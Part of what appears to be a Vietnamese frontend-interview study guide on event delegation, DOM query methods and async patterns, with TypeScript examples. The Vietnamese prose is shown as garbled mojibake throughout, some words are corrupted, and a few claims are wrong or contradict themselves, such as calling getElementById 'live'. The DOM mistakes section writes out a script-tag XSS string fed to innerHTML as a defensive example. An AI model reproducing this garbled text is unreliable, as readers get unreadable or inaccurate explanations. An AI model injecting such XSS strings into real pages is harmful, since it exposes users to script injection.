**üìö Ph·∫ßn 2: Event Delegation (K·ªπ Thu·∫≠t ·ª¶y Quy·ªÅn Event)**

**üî• Kh√°i Ni·ªám:**

Event Delegation l√† k·ªπ thu·∫≠t thay v√¨ g·∫Øn event listener cho t·ª´ng element con, ta ch·ªâ g·∫Øn 1 listener duy nh·∫•t cho element cha, sau ƒë√≥ ki·ªÉm tra xem element n√†o ƒë∆∞·ª£c click th√¥ng qua `event.target`.

**üí° L·ª£i √çch:**

1. **Performance t·ªët h∆°n**: Ch·ªâ c√≥ 1 event listener thay v√¨ h√†ng trƒÉm/ng√†n listeners
2. **Memory hi·ªáu qu·∫£**: √çt listeners = √≠t b·ªô nh·ªõ  
3. **Dynamic content**: T·ª± ƒë·ªông handle c√°c elements ƒë∆∞·ª£c th√™m sau
4. **Maintainability**: Code d·ªÖ b·∫£o tr√¨ h∆°n

**üéØ Code Example v·ªõi Ch√∫ Th√≠ch Chi Ti·∫øt:**

```typescript
 // Ch√∫ gi·∫£i: ============================================
// ‚ùå C√ÅCH KH√îNG HI·ªÜU QU·∫¢: Attach event cho t·ª´ng item
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: HTML: <ul id="todoList">
 // Ch√∫ gi·∫£i: <li class="todo-item" data-id="1">Task 1 <button class="delete">X</button></li>
 // Ch√∫ gi·∫£i: <li class="todo-item" data-id="2">Task 2 <button class="delete">X</button></li>
 // Ch√∫ gi·∫£i: <li class="todo-item" data-id="3">Task 3 <button class="delete">X</button></li>
 // Ch√∫ gi·∫£i: </ul>

// ‚ùå V·∫§N ƒê·ªÄ: N·∫øu c√≥ 1000 items th√¨ t·∫°o 1000 event listeners!
const todoItems = document.querySelectorAll('.todo-item');
todoItems.forEach((item) => {
  item.addEventListener('click', (e: Event) => {
    console.log('Todo clicked:', item.dataset.id);
    // Ch√∫ th√≠ch: M·ªói item c√≥ 1 listener ri√™ng ‚Üí t·ªën memory
  });
});

 // Ch√∫ gi·∫£i: ============================================
// ‚úÖ C√ÅCH HI·ªÜU QU·∫¢: EVENT DELEGATION
 // Ch√∫ gi·∫£i: ============================================

// ‚úÖ Ch·ªâ c·∫ßn 1 listener tr√™n parent (ul)
document.getElementById('todoList')?.addEventListener('click', (e: Event) => {
  const target = e.target as HTMLElement;

  // Ch√∫ th√≠ch: Ki·ªÉm tra xem element ƒë∆∞·ª£c click c√≥ ph·∫£i l√† todo-item kh√¥ng
  if (target.classList.contains('todo-item')) {
    console.log('‚úÖ Todo clicked:', target.dataset.id);
    // Ch√∫ th√≠ch: X·ª≠ l√Ω click v√†o todo item
  }

  // Ch√∫ th√≠ch: Ki·ªÉm tra xem c√≥ ph·∫£i click v√†o n√∫t delete kh√¥ng
  if (target.classList.contains('delete')) {
    // closest() t√¨m parent element g·∫ßn nh·∫•t c√≥ class 'todo-item'
    const todoItem = target.closest('.todo-item') as HTMLElement;
    console.log('üóëÔ∏è Delete clicked for todo:', todoItem?.dataset.id);
    todoItem?.remove(); // X√≥a todo item
  }
});

// ‚úÖ Th√™m item m·ªõi - KH√îNG C·∫¶N attach listener
function addTodoItem(text: string, id: string): void {
  const todoList = document.getElementById('todoList');
  const newItem = document.createElement('li');
  newItem.className = 'todo-item';
  newItem.dataset.id = id;
  newItem.innerHTML = `${text} <button class="delete">X</button>`;
  todoList?.appendChild(newItem);
  
  // üéâ Event delegation t·ª± ƒë·ªông handle item m·ªõi!
  // Kh√¥ng c·∫ßn addEventListener() ·ªü ƒë√¢y
}
```

---

**üìö Ph·∫ßn 3: target vs currentTarget - Hi·ªÉu R√µ S·ª± Kh√°c Bi·ªát**

**üî• ƒê·ªãnh Nghƒ©a:**

- **`event.target`**: Element TH·ª∞C S·ª∞ ƒë∆∞·ª£c click (c√≥ th·ªÉ l√† element con s√¢u b√™n trong)
- **`event.currentTarget`**: Element c√≥ EVENT LISTENER ƒë∆∞·ª£c attach (lu√¥n l√† element ta g·ªçi addEventListener)

**üéØ Code Example:**

```typescript
 // Ch√∫ gi·∫£i: HTML: <div id="parent">
 // Ch√∫ gi·∫£i: <button id="child">Click Me!</button>
 // Ch√∫ gi·∫£i: </div>

document.getElementById('parent')?.addEventListener('click', (e: Event) => {
  console.log('target:', e.target); // Ch√∫ gi·∫£i: <button id="child">
  console.log('currentTarget:', e.currentTarget); // Ch√∫ gi·∫£i: <div id="parent">
  
  // Ch√∫ th√≠ch:
  // - target = button (th·ª© ƒë∆∞·ª£c click th·ª±c s·ª±)
  // - currentTarget = div parent (n∆°i c√≥ addEventListener)
});
```

**üìå So S√°nh:**

| Property | target | currentTarget |
|----------|--------|---------------|
| **ƒê·ªãnh nghƒ©a** | Element TH·ª∞C S·ª∞ ƒë∆∞·ª£c click | Element C√ì addEventListener() |
| **Trong event delegation** | Con ho·∫∑c ch√°u c·ªßa currentTarget | Lu√¥n l√† parent element |
| **S·ª≠ d·ª•ng** | X√°c ƒë·ªãnh element c·ª• th·ªÉ ƒë∆∞·ª£c t∆∞∆°ng t√°c | Truy c·∫≠p data/properties c·ªßa parent |

---

**‚úÖ Best Practices:**

1. S·ª≠ d·ª•ng Event Delegation cho dynamic content
2. S·ª≠ d·ª•ng `closest()` ƒë·ªÉ t√¨m parent element
3. Check target type tr∆∞·ªõc khi x·ª≠ l√Ω
4. S·ª≠ d·ª•ng `stopPropagation()` khi c·∫ßn thi·∫øt
5. S·ª≠ d·ª•ng `preventDefault()` cho forms v√† links

**‚ùå Common Mistakes:**

1. Nh·∫ßm l·∫´n target vs currentTarget
2. Kh√¥ng check element type
3. Qu√™n stopPropagation() khi c√≥ nested events
4. Event delegation nh∆∞ng kh√¥ng check target
5. Mix capturing v√† bubbling kh√¥ng r√µ r√†ng
---
## 12. üåê Q12: DOM API & Query Methods  

**P1: T√™n c√¢u h·ªèi:** üåê Q12: DOM API & Query Methods  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"DOM API cung c·∫•p methods ƒë·ªÉ query v√† manipulate DOM. Query methods c√≥ performance v√† behaviors kh√°c nhau - c·∫ßn hi·ªÉu live vs static collections."**

**üîë 4 Query Methods Ch√≠nh:**

**1. getElementById:**
- **Nhanh nh·∫•t** (browser optimize v·ªõi hash table)
- Return **single element** ho·∫∑c `null`
- Unique trong document (IDs ph·∫£i unique)

**2. querySelector / querySelectorAll:**
- Nh·∫≠n **CSS selectors** (`.class`, `#id`, `[attr]`, `:nth-child()`)
- `querySelector`: first match, `querySelectorAll`: **NodeList** (static snapshot)
- **Static** ‚Üí kh√¥ng t·ª± update khi DOM thay ƒë·ªïi

**3. getElementsByClassName / getElementsByTagName:**
- Return **HTMLCollection** (live collection)
- **Live** ‚Üí t·ª± update khi DOM thay ƒë·ªïi (c√≥ th·ªÉ g√¢y bugs)
- Nhanh h∆°n querySelectorAll nh∆∞ng √≠t flexible h∆°n

**4. Performance:**
- `getElementById` > `getElementsByClassName` > `querySelector` > `querySelectorAll` v·ªõi complex selectors
- **Cache references** khi query nhi·ªÅu l·∫ßn c√πng element

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- L·∫∑p qua `querySelectorAll` m√† nghƒ© n√≥ l√† array ‚Üí ph·∫£i convert `[...nodeList]` ho·∫∑c `Array.from()`
- Iterate HTMLCollection **trong v√≤ng l·∫∑p modify DOM** ‚Üí collection t·ª± update ‚Üí infinite loop
- Query to√†n document khi ch·ªâ c·∫ßn query trong container ‚Üí ch·∫≠m, d√πng `container.querySelector()`

**üí° Ki·∫øn Th·ª©c Senior:**
- **Live vs Static**: HTMLCollection (live) vs NodeList (c√≥ th·ªÉ live ho·∫∑c static t√πy method)
  - `getElementsBy*` ‚Üí live HTMLCollection
  - `querySelectorAll` ‚Üí static NodeList
  - `childNodes` ‚Üí live NodeList
- **Reflow/Repaint**: M·ªói DOM manipulation c√≥ th·ªÉ trigger layout recalculation
  - Batch updates: d√πng DocumentFragment ho·∫∑c `.innerHTML` thay v√¨ nhi·ªÅu `.appendChild()`
  - Read tr∆∞·ªõc, write sau ƒë·ªÉ tr√°nh **layout thrashing** (ƒë·ªçc offsetHeight ‚Üí ghi style ‚Üí ƒë·ªçc ‚Üí ghi ‚Üí ...)
- **MutationObserver** hi·ªáu qu·∫£ h∆°n polling DOM changes
- Modern frameworks (React, Vue) d√πng Virtual DOM ƒë·ªÉ minimize direct DOM manipulation




**‚ö° Quick Summary:**
> querySelector = CSS selector. getElementById = nhanh nh·∫•t. querySelectorAll = NodeList

**üí° Ghi Nh·ªõ:**
- ‚ö° **getElementById**: Nhanh nh·∫•t, live
- üéØ **querySelector**: CSS selector, static
- üìã **querySelectorAll**: Return NodeList (not array)

**Tr·∫£ l·ªùi:**

- **DOM API**: C√°c methods ƒë·ªÉ manipulate DOM elements
- **Query Methods**: C√°c methods ƒë·ªÉ select elements t·ª´ DOM
- **Ho·∫°t ƒë·ªông**: getElementById, querySelector, getElementsByClassName, etc.
- **∆Øu ƒëi·ªÉm**: Flexible element selection, powerful manipulation
- **Nh∆∞·ª£c ƒëi·ªÉm**: C√≥ th·ªÉ ch·∫≠m v·ªõi large DOM, c·∫ßn hi·ªÉu r√µ performance

**Code Example:**

```typescript
 // Ch√∫ gi·∫£i: Query Methods
// getElementById - tr·∫£ v·ªÅ single element
const element = document.getElementById('myId');
if (element) {
  element.textContent = 'Hello World';
}

// querySelector - tr·∫£ v·ªÅ first matching element
const firstDiv = document.querySelector('div');
const firstClass = document.querySelector('.my-class');
const firstId = document.querySelector('#my-id');

// querySelectorAll - tr·∫£ v·ªÅ NodeList
const allDivs = document.querySelectorAll('div');
const allClasses = document.querySelectorAll('.my-class');

// getElementsByClassName - tr·∫£ v·ªÅ HTMLCollection
const elementsByClass = document.getElementsByClassName('my-class');

// getElementsByTagName - tr·∫£ v·ªÅ HTMLCollection
const elementsByTag = document.getElementsByTagName('div');

 // Ch√∫ gi·∫£i: DOM Manipulation
const div = document.createElement('div');
div.textContent = 'New element';
div.className = 'my-class';
div.id = 'new-id';

 // Ch√∫ gi·∫£i: Append to DOM
document.body.appendChild(div);

 // Ch√∫ gi·∫£i: Insert before
const existingElement = document.getElementById('existing');
existingElement?.parentNode?.insertBefore(div, existingElement);

 // Ch√∫ gi·∫£i: Remove element
div.remove();

 // Ch√∫ gi·∫£i: Update attributes
div.setAttribute('data-id', '123');
div.getAttribute('data-id'); // Ch√∫ gi·∫£i: '123'
div.removeAttribute('data-id');

 // Ch√∫ gi·∫£i: Update classes
div.classList.add('new-class');
div.classList.remove('old-class');
div.classList.toggle('active');
div.classList.contains('active'); // Ch√∫ gi·∫£i: true/false

 // Ch√∫ gi·∫£i: Update styles
div.style.color = 'red';
div.style.backgroundColor = 'blue';
div.style.display = 'none';

 // Ch√∫ gi·∫£i: Update content
div.textContent = 'Text content';
div.innerHTML = '<span>HTML content</span>';
div.innerText = 'Text only (no HTML)';

 // Ch√∫ gi·∫£i: Event handling
div.addEventListener('click', (e: Event) => {
  console.log('Div clicked');
});

 // Ch√∫ gi·∫£i: Remove event listener
const clickHandler = (e: Event) => console.log('Clicked');
div.addEventListener('click', clickHandler);
div.removeEventListener('click', clickHandler);
```

**Best Practices:**

- S·ª≠ d·ª•ng querySelector cho modern development
- S·ª≠ d·ª•ng getElementById cho single elements
- S·ª≠ d·ª•ng addEventListener thay v√¨ onclick
- S·ª≠ d·ª•ng proper error handling

**Mistakes:**

```typescript
// ‚ùå Sai: Kh√¥ng check null
const element = document.getElementById('myId');
element.textContent = 'Hello'; // Error n·∫øu element null

// ‚úÖ ƒê√∫ng: Check null
const element = document.getElementById('myId');
if (element) {
  element.textContent = 'Hello';
}

 // Ch√∫ gi·∫£i: ‚ùå Sai: S·ª≠ d·ª•ng innerHTML v·ªõi user input
const userInput = '<script>alert("XSS")</script>';
div.innerHTML = userInput; // Ch√∫ gi·∫£i: XSS vulnerability

// ‚úÖ ƒê√∫ng: S·ª≠ d·ª•ng textContent
div.textContent = userInput; // Ch√∫ gi·∫£i: Safe
```
---
## 13. ‚öôÔ∏è Q13: Async/Await vs Promises vs Callbacks & Promise.all/any/race  

**P1: T√™n c√¢u h·ªèi:** ‚öôÔ∏è Q13: Async/Await vs Promises vs Callbacks & Promise.all/any/race  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"JavaScript async ti·∫øn h√≥a: Callbacks ‚Üí Promises ‚Üí Async/Await. M·ªói m·∫´u gi·∫£i quy·∫øt code b·∫•t ƒë·ªìng b·ªô v·ªõi ƒë√°nh ƒë·ªïi kh√°c nhau.**

**üìä Ti·∫øn H√≥a M·∫´u Async:**
1. **Callbacks**: H√†m l√†m tham s·ªë ‚Üí th·ª±c thi sau khi ho√†n th√†nh thao t√°c b·∫•t ƒë·ªìng b·ªô.
   - ‚ùå Callback Hell (kim t·ª± th√°p h·ªßy di·ªát), x·ª≠ l√Ω l·ªói kh√≥.
   - ‚úÖ ƒê∆°n gi·∫£n, h·ªó tr·ª£ ph·ªï bi·∫øn.

2. **Promises**: Object ƒë·∫°i di·ªán cho vi·ªác ho√†n th√†nh/th·∫•t b·∫°i trong t∆∞∆°ng lai.
   - ‚úÖ Chu·ªói (`.then()`), x·ª≠ l√Ω l·ªói t·ªët h∆°n (`.catch()`), tr√°nh callback hell.
   - ‚ùå V·∫´n d√†i d√≤ng, c√≥ th·ªÉ `.then()` hell.
   - **Tr·∫°ng th√°i**: Pending ‚Üí Fulfilled (resolved) | Rejected.

3. **Async/Await**: C√∫ ph√°p ƒë∆∞·ªùng cho Promises ‚Üí code gi·ªëng sync.
   - ‚úÖ D·ªÖ ƒë·ªçc (nh∆∞ code sync), `try/catch` cho l·ªói.
   - ‚ùå Ph·∫£i d√πng `await` trong h√†m `async`, tu·∫ßn t·ª± theo m·∫∑c ƒë·ªãnh (kh√¥ng song song).

**üîß Promise Combinators (4 Ph∆∞∆°ng Th·ª©c):**
1. **`Promise.all([p1, p2, p3])`**:
   - ƒê·ª£i T·∫§T C·∫¢ promises resolve.
   - Reject ngay n·∫øu 1 promise reject (th·∫•t b·∫°i nhanh).
   - Tr·∫£ v·ªÅ m·∫£ng k·∫øt qu·∫£ theo th·ª© t·ª±.
   - ‚úÖ Tr∆∞·ªùng h·ª£p: L·∫•y nhi·ªÅu t√†i nguy√™n, t·∫•t c·∫£ ƒë·ªÅu c·∫ßn.

2. **`Promise.allSettled([p1, p2, p3])`**:
   - ƒê·ª£i T·∫§T C·∫¢ promises ho√†n th√†nh (fulfilled ho·∫∑c rejected).
   - Kh√¥ng bao gi·ªù reject.
   - Tr·∫£ v·ªÅ m·∫£ng `{ status, value/reason }`.
   - ‚úÖ Tr∆∞·ªùng h·ª£p: Th·ª±c thi t·∫•t c·∫£, kh√¥ng quan t√¢m th√†nh c√¥ng/th·∫•t b·∫°i c·ªßa t·ª´ng c√°i.

3. **`Promise.race([p1, p2, p3])`**:
   - Resolve/reject v·ªõi promise ƒë·∫ßu ti√™n ho√†n th√†nh (nhanh nh·∫•t th·∫Øng).
   - ‚úÖ Tr∆∞·ªùng h·ª£p: C∆° ch·∫ø timeout, ph·∫£n h·ªìi server nhanh nh·∫•t.

4. **`Promise.any([p1, p2, p3])`**:
   - Resolve v·ªõi promise ƒë·∫ßu ti√™n fulfilled.
   - Reject n·∫øu T·∫§T C·∫¢ reject (AggregateError).
   - ‚úÖ Tr∆∞·ªùng h·ª£p: C∆° ch·∫ø d·ª± ph√≤ng, ph·∫£n h·ªìi th√†nh c√¥ng ƒë·∫ßu ti√™n.

**üéØ Practical Examples:**
```js
 // Ch√∫ gi·∫£i: Sequential (slow - 3s total)
async function sequential() {
  const user = await fetchUser(); // Ch√∫ gi·∫£i: 1s
  const posts = await fetchPosts(); // Ch√∫ gi·∫£i: 1s
  const comments = await fetchComments(); // Ch√∫ gi·∫£i: 1s
}

 // Ch√∫ gi·∫£i: Parallel (fast - 1s total)
async function parallel() {
  const [user, posts, comments] = await Promise.all([
    fetchUser(),
    fetchPosts(),
    fetchComments()
  ]); // Ch√∫ gi·∫£i: All run concurrently!
}

 // Ch√∫ gi·∫£i: Timeout with race
const fetchWithTimeout = (url, timeout = 5000) => {
  return Promise.race([
    fetch(url),
    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
  ]);
};
```

**‚ö†Ô∏è Common Mistakes:**
- **Forgot `await`**: Promise kh√¥ng execute ‚Üí return Promise object, kh√¥ng ph·∫£i value.
- **Sequential khi c√≥ th·ªÉ parallel**: `await` trong loop ‚Üí ch·∫≠m. D√πng `Promise.all()`.
  ```js
 // Ch√∫ gi·∫£i: ‚ùå Slow (sequential)
  for (const id of ids) {
    await fetchUser(id); // Ch·ªù t·ª´ng c√°i
  }
 // Ch√∫ gi·∫£i: ‚úÖ Fast (parallel)
  await Promise.all(ids.map(id => fetchUser(id)));
  ```
- **Unhandled rejections**: Missing `.catch()` ho·∫∑c `try/catch` ‚Üí silent failures.
- **Promise.all fail-fast**: 1 promise fail ‚Üí t·∫•t c·∫£ fail. D√πng `allSettled` n·∫øu c·∫ßn.

**üí° Senior Insights:**
- **Error handling**: `try/catch` trong async function catch b·∫•t k·ª≥ `await` nNano throw.
- **Top-level await**: ES2022 ‚Üí `await` ngoNani async function trong modules.
- **Microtask queue**: Promises execute trong microtask queue ‚Üí priority h∆°n setTimeout.
- **Cancellation**: Native promises kh√¥ng support cancel ‚Üí d√πng AbortController (fetch) ho·∫∑c libraries (Bluebird).

---

**‚ö° Quick Summary:**
> Callbacks = nested hell. Promises = chaining. Async/await = sync-like code. Promise.all/any/race/allSettled = combine nhi·ªÅu promises

**üí° Ghi Nh·ªõ:**
- üéØ **Callbacks**: Nested = hell, error handling kh√≥
- üìå **Promises**: Chaining v·ªõi .then(), error v·ªõi .catch()
- ‚ö° **Async/Await**: Sync-like code, try/catch cho errors
- üî• **Combinators**: all (all success), any (first success), race (first done), allSettled (all done)

**Tr·∫£ l·ªùi:**

**Ph·∫ßn 1: Async Patterns**

- **Callbacks**: Functions ƒë∆∞·ª£c pass v√†o other functions ƒë·ªÉ execute sau
- **Promises**: Objects ƒë·∫°i di·ªán cho eventual completion/failure c·ªßa async operation
- **Async/Await**: Syntactic sugar cho Promises, l√†m code d·ªÖ ƒë·ªçc h∆°n

**Ph·∫ßn 2: Promise Combinators**

- **Promise.all**: ƒê·ª£i t·∫•t c·∫£ promises resolve, reject n·∫øu c√≥ 1 promise reject
- **Promise.any**: Resolve khi c√≥ 1 promise resolve, reject n·∫øu t·∫•t c·∫£ reject
- **Promise.race**: Resolve/reject v·ªõi promise ƒë·∫ßu ti√™n ho√†n th√†nh
- **Promise.allSettled**: ƒê·ª£i t·∫•t c·∫£ promises complete (resolve ho·∫∑c reject)

**Code Example:**

```typescript
 // Ch√∫ gi·∫£i: Callbacks
function fetchData(callback: (error: Error | null, data?: any) => void): void {
  setTimeout(() => {
    const data = { message: 'Hello World' };
    callback(null, data);
  }, 1000);
}

fetchData((error, data) => {
  if (error) {
    console.error('Error:', error);
  } else {
    console.log('Data:', data);
  }
});

 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
function fetchDataPromise(): Promise<any> {
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      const data = { message: 'Hello World' };
      resolve(data);
    }, 1000);
  });
}

fetchDataPromise()
  .then((data) => console.log('Data:', data))
  .catch((error) => console.error('Error:', error));

 // Ch√∫ gi·∫£i: Async/Await
async function fetchDataAsync(): Promise<any> {
  try {
    const data = await fetchDataPromise();
    console.log('Data:', data);
    return data;
  } catch (error) {
    console.error('Error:', error);
    throw error;
  }
}
```

**Best Practices:**

- S·ª≠ d·ª•ng async/await cho modern code
- S·ª≠ d·ª•ng proper error handling
- Tr√°nh callback hell
- S·ª≠ d·ª•ng TypeScript cho type safety

#### **üî• Advanced Async Patterns - C√°c V·∫•n ƒê·ªÅ B·∫•t ƒê·ªìng B·ªô Ph·ª©c T·∫°p**

**üí° Sau khi hi·ªÉu c∆° b·∫£n v·ªÅ Callbacks, Promises, Async/Await, h√£y gi·∫£i quy·∫øt c√°c v·∫•n ƒë·ªÅ th·ª±c t·∫ø ph·ª©c t·∫°p h∆°n!**

---

#### **1Ô∏è‚É£ Error Handling - X·ª≠ L√Ω L·ªói N√¢ng Cao**

**üîπ Problem: Async errors kh√¥ng b·ªã catch**

```typescript
// ‚ùå V·∫§N ƒê·ªÄ: Unhandled Promise Rejection
async function fetchUser(id: string) {
  const response = await fetch(`/api/users/${id}`);
  return response.json(); // N·∫øu response.json() throw error?
}

 // Ch√∫ gi·∫£i: Calling without try-catch ‚Üí Unhandled rejection!
fetchUser('123'); // ‚ùå N·∫øu API fail ‚Üí unhandled rejection

// ‚úÖ GI·∫¢I PH√ÅP 1: Try-catch trong function
async function fetchUserSafe(id: string) {
  try {
    const response = await fetch(`/api/users/${id}`);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error('Failed to fetch user:', error);
    throw error; // Re-throw ƒë·ªÉ caller handle
  }
}

// ‚úÖ GI·∫¢I PH√ÅP 2: Global error handler
window.addEventListener('unhandledrejection', (event) => {
  console.error('Unhandled promise rejection:', event.reason);
  
 // Ch√∫ gi·∫£i: Send to error tracking service (Sentry, Datadog)
  sendToErrorTracking({
    type: 'UNHANDLED_PROMISE_REJECTION',
    error: event.reason,
    timestamp: Date.now(),
  });
  
 // Ch√∫ gi·∫£i: Prevent default browser behavior
  event.preventDefault();
});

// ‚úÖ GI·∫¢I PH√ÅP 3: Wrapper function v·ªõi automatic error handling
async function safeAsync<T>(
  fn: () => Promise<T>,
  fallback?: T
): Promise<T | undefined> {
  try {
    return await fn();
  } catch (error) {
    console.error('Async error:', error);
    return fallback;
  }
}

 // Ch√∫ gi·∫£i: Usage
const user = await safeAsync(() => fetchUser('123'), { id: '123', name: 'Default' });
```

**üîπ Problem: Mixed sync/async errors**

```typescript
// ‚ùå V·∫§N ƒê·ªÄ: Sync errors kh√¥ng ƒë∆∞·ª£c catch b·ªüi try-catch async
async function processData(data: any[]) {
  try {
    const validated = validateData(data); // Sync function c√≥ th·ªÉ throw
    const results = await Promise.all(
      validated.map(item => processItem(item)) // Ch√∫ gi·∫£i: Async function
    );
    return results;
  } catch (error) {
    // ‚ö†Ô∏è Catch ƒë∆∞·ª£c c·∫£ sync V√Ä async errors
    console.error('Process failed:', error);
    throw error;
  }
}

// ‚úÖ BEST PRACTICE: Wrap sync code trong Promise n·∫øu c·∫ßn
async function processDataSafe(data: any[]) {
  try {
 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
    const validated = await Promise.resolve(validateData(data));
    const results = await Promise.all(
      validated.map(item => processItem(item))
    );
    return results;
  } catch (error) {
    console.error('Process failed:', error);
    throw error;
  }
}
```

---

#### **2Ô∏è‚É£ Race Conditions - X·ª≠ L√Ω T√¨nh Hu·ªëng Ch·∫°y ƒêua**

**üîπ Problem: Multiple concurrent requests**

```typescript
// ‚ùå V·∫§N ƒê·ªÄ: User search - requests out of order
let searchTerm = '';

async function handleSearch(term: string) {
  searchTerm = term;
  
 // Ch√∫ gi·∫£i: Slow request (200ms)
  const results = await fetch(`/api/search?q=${term}`).then(r => r.json());
  
  // ‚ö†Ô∏è V·∫§N ƒê·ªÄ: N·∫øu user type "abc" r·ªìi x√≥a v·ªÅ "ab":
  // Request "ab" g·ª≠i tr∆∞·ªõc, nh∆∞ng "abc" v·ªÅ sau
  // ‚Üí Hi·ªÉn th·ªã sai k·∫øt qu·∫£!
  displayResults(results);
}

// ‚úÖ GI·∫¢I PH√ÅP 1: Track latest request v·ªõi counter
let requestId = 0;

async function handleSearchSafe(term: string) {
  const currentRequestId = ++requestId;
  
  const results = await fetch(`/api/search?q=${term}`).then(r => r.json());
  
  // Ch·ªâ hi·ªÉn th·ªã n·∫øu l√† request m·ªõi nh·∫•t
  if (currentRequestId === requestId) {
    displayResults(results);
  } else {
    console.log('Discarding stale result');
  }
}

// ‚úÖ GI·∫¢I PH√ÅP 2: AbortController ƒë·ªÉ cancel previous requests
let abortController: AbortController | null = null;

async function handleSearchWithAbort(term: string) {
 // Ch√∫ gi·∫£i: Cancel previous request
  if (abortController) {
    abortController.abort();
  }
  
 // Ch√∫ gi·∫£i: Create new controller
  abortController = new AbortController();
  
  try {
    const results = await fetch(`/api/search?q=${term}`, {
      signal: abortController.signal,
    }).then(r => r.json());
    
    displayResults(results);
  } catch (error: any) {
    if (error.name === 'AbortError') {
      console.log('Request cancelled');
    } else {
      throw error;
    }
  }
}

// ‚úÖ GI·∫¢I PH√ÅP 3: Debounce + Abort (Best for search)
import { debounce } from 'lodash';

let searchAbortController: AbortController | null = null;

const debouncedSearch = debounce(async (term: string) => {
  if (searchAbortController) {
    searchAbortController.abort();
  }
  
  searchAbortController = new AbortController();
  
  try {
    const results = await fetch(`/api/search?q=${term}`, {
      signal: searchAbortController.signal,
    }).then(r => r.json());
    
    displayResults(results);
  } catch (error: any) {
    if (error.name !== 'AbortError') {
      console.error('Search failed:', error);
    }
  }
}, 300); // Ch√∫ gi·∫£i: Wait 300ms sau khi user ng·ª´ng typing

 // Ch√∫ gi·∫£i: Usage: G·ªçi m·ªói khi user type
inputElement.addEventListener('input', (e) => {
  debouncedSearch(e.target.value);
});
```

**üîπ Problem: Concurrent updates to shared state**

```typescript
// ‚ùå V·∫§N ƒê·ªÄ: Multiple async operations update same state
let balance = 1000;

async function withdraw(amount: number) {
 // Ch√∫ gi·∫£i: Simulate API call
  await delay(100);
  
  if (balance >= amount) {
    balance -= amount; // Ch√∫ gi·∫£i: ‚ö†Ô∏è Race condition!
    console.log(`Withdrew ${amount}, balance: ${balance}`);
  }
}

// G·ªçi ƒë·ªìng th·ªùi
withdraw(600); // Ch√∫ gi·∫£i: T0: Check balance = 1000 ‚úÖ
withdraw(600); // Ch√∫ gi·∫£i: T1: Check balance = 1000 ‚úÖ
 // Ch√∫ gi·∫£i: T2: Balance = 400 ‚ùå (Should be rejected!)

// ‚úÖ GI·∫¢I PH√ÅP 1: Mutex lock
class Mutex {
  private locked = false;
  private waiting: Array<() => void> = [];
  
  async lock(): Promise<void> {
    if (!this.locked) {
      this.locked = true;
      return;
    }
    
 // Ch√∫ gi·∫£i: Wait for unlock
    await new Promise<void>(resolve => {
      this.waiting.push(resolve);
    });
  }
  
  unlock(): void {
    const next = this.waiting.shift();
    if (next) {
      next();
    } else {
      this.locked = false;
    }
  }
}

const balanceMutex = new Mutex();

async function withdrawSafe(amount: number) {
  await balanceMutex.lock();
  
  try {
    await delay(100);
    
    if (balance >= amount) {
      balance -= amount;
      console.log(`Withdrew ${amount}, balance: ${balance}`);
    } else {
      console.log('Insufficient funds');
    }
  } finally {
    balanceMutex.unlock();
  }
}

// ‚úÖ GI·∫¢I PH√ÅP 2: Queue pattern
class WithdrawalQueue {
  private queue: Array<() => Promise<void>> = [];
  private processing = false;
  
  async add(fn: () => Promise<void>) {
    this.queue.push(fn);
    
    if (!this.processing) {
      await this.process();
    }
  }
  
  private async process() {
    this.processing = true;
    
    while (this.queue.length > 0) {
      const fn = this.queue.shift()!;
      await fn();
    }
    
    this.processing = false;
  }
}

const withdrawalQueue = new WithdrawalQueue();

async function withdrawQueued(amount: number) {
  await withdrawalQueue.add(async () => {
    await delay(100);
    
    if (balance >= amount) {
      balance -= amount;
      console.log(`Withdrew ${amount}, balance: ${balance}`);
    } else {
      console.log('Insufficient funds');
    }
  });
}
```

---

#### **3Ô∏è‚É£ Timeout & Retry - X·ª≠ L√Ω Timeout & Th·ª≠ L·∫°i**

**üîπ Problem: Requests hang forever**

```typescript
// ‚ùå V·∫§N ƒê·ªÄ: Request kh√¥ng c√≥ timeout
async function fetchData() {
  const response = await fetch('/api/data'); // Hang forever n·∫øu server kh√¥ng respond
  return response.json();
}

// ‚úÖ GI·∫¢I PH√ÅP 1: Promise.race v·ªõi timeout
async function fetchWithTimeout<T>(
  promise: Promise<T>,
  timeoutMs: number
): Promise<T> {
  const timeoutPromise = new Promise<never>((_, reject) => {
    setTimeout(() => reject(new Error('Timeout')), timeoutMs);
  });
  
  return Promise.race([promise, timeoutPromise]);
}

 // Ch√∫ gi·∫£i: Usage
try {
  const data = await fetchWithTimeout(
    fetch('/api/data').then(r => r.json()),
    5000 // Ch√∫ gi·∫£i: 5 seconds timeout
  );
  console.log('Data:', data);
} catch (error) {
  console.error('Request failed or timed out:', error);
}

// ‚úÖ GI·∫¢I PH√ÅP 2: AbortController v·ªõi timeout
async function fetchWithAbortTimeout(url: string, timeoutMs: number) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
  
  try {
    const response = await fetch(url, { signal: controller.signal });
    clearTimeout(timeoutId);
    return await response.json();
  } catch (error: any) {
    clearTimeout(timeoutId);
    
    if (error.name === 'AbortError') {
      throw new Error('Request timeout');
    }
    throw error;
  }
}

// ‚úÖ GI·∫¢I PH√ÅP 3: Reusable timeout wrapper
function withTimeout<T>(
  promise: Promise<T>,
  timeoutMs: number,
  errorMessage = 'Operation timeout'
